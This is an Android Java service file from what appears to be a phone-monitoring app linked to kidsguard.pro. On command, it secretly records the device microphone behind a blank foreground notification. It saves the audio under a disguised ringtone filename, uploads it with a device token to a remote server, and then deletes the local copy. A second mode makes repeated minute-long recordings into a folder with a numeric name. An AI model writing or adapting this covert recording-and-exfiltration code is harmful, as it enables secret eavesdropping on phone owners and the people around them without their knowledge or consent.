package pro.tasking;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.widget.Toast;

import net.gotev.uploadservice.MultipartUploadRequest;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.UUID;

public class AudioService extends Service {
    String pathSave;
    MediaRecorder mediaRecorder;
    String Type,durst;
    int min;
    private String curedate;

    public AudioService() {}

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            createNotificationChannel();
            Notification notification = new NotificationCompat.Builder(getApplicationContext(), "ForegroundServiceChannel")
                    .build();
            startForeground(1, notification);

        }

        pathSave= Environment.getExternalStorageDirectory().getAbsolutePath()+"/"+"Ringtones"+"mine.mp3";
        if (intent!=null) {
            durst = (String) intent.getExtras().get("dur");
            Type = (String) intent.getExtras().get("type");
            if (Type.equals("dating")) {
                pathSave = Environment.getExternalStorageDirectory().getAbsolutePath() + "/" + "Ringtones" + "minedate.mp3";
            }
            Log.e("rttredfgf", Type + ".." + durst);
            if (Type.equals("not")) {
                setupMediaRecorder();
                try {
                    mediaRecorder.prepare();
                    mediaRecorder.start();
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (IllegalStateException e) {
                }
                if (Type.equals("not")) {
                    Handler handler = new Handler();
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            mediaRecorder.stop();
                            //Upload();
                            Upload2();

                        }
                    }, 40000);
                    Handler handler1 = new Handler();
                    handler1.postDelayed(new Runnable() {
                        @RequiresApi(api = Build.VERSION_CODES.N)
                        @Override
                        public void run() {
                            File dir = new File(pathSave);
                            if (dir.exists()) {
                                dir.delete();
                            }
                            //stopForeground(0);

                        }
                    }, 55000);
                } else if (Type.equals("dating")) {
                    Handler handler = new Handler();
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            mediaRecorder.stop();


                        }
                    }, Long.parseLong(durst));
                }
            } else if (Type.equals("dating")) {
                Log.e("rttredfgf", Type + ".." + durst);
                Toast.makeText(this, Type + ".." + durst, Toast.LENGTH_SHORT).show();
                min = Integer.parseInt(durst) / 60000;
                setdatingvoice();
            }
        }
        return super.onStartCommand(intent,flags,startId);
    }
    private void setupMediaRecorder() {
        mediaRecorder =new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
        mediaRecorder.setOutputFile(pathSave);
    }
    public void Upload(){
        try {
            String uploadId = UUID.randomUUID().toString();
            //Creating a multi part request
            new MultipartUploadRequest(this, uploadId,"https://req.kidsguard.pro/api/putVoice/")
                    .addFileToUpload(pathSave, "voice") //Adding file
                    .addParameter("token", getToken(getApplicationContext())) //Adding text parameter to the request
                    .setMaxRetries(2)
                    .startUpload();
        } catch (Exception exc) {

        }
    }
    public void Upload2(){
        try {
            String uploadId = UUID.randomUUID().toString();
            //Creating a multi part request
            new MultipartUploadRequest(getApplicationContext(), uploadId,"https://im.kidsguard.pro/api/put-voice/")
                    .addFileToUpload(pathSave, "voice") //Adding file
                    .addParameter("token", getToken(getApplicationContext()))
                    .addParameter("token1", "AllowVoice")//Adding text parameter to the request
                    .setMaxRetries(2)

                    .startUpload(); //Starting the upload
            //Toast.makeText(this, "don", Toast.LENGTH_SHORT).show();

        } catch (Exception exc) {

            // Toast.makeText(this, exc.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "ForegroundServiceChannel",
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            serviceChannel.setShowBadge(false);



            NotificationManager manager = getSystemService(NotificationManager.class);

            manager.createNotificationChannel(serviceChannel);

        }
    }
    public  String getToken(Context context){
        String token=null;
        TokenDataBaseManager tokenDataBaseManager=new TokenDataBaseManager(context);
        token=tokenDataBaseManager.gettoken();
        tokenDataBaseManager.close();
        return token;

    }
    public void setdatingvoice(){
        File file=new File(Environment.getExternalStorageDirectory().getAbsolutePath(),"45854455555");
        if (!file.exists()){file.mkdirs();}
        Date curDate = new Date(System.currentTimeMillis());
        curedate=curDate.toString();
        mediaRecorder =new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
        mediaRecorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath()+"/45854455555/"+curedate+".mp3");
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (IOException e) {
            e.printStackTrace();
        }catch (IllegalStateException e){}
        Handler handler=new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                min--;
                mediaRecorder.stop();
                if (min>0){
                    setdatingvoice();
                }


            }
        }, 60000);
    }


}

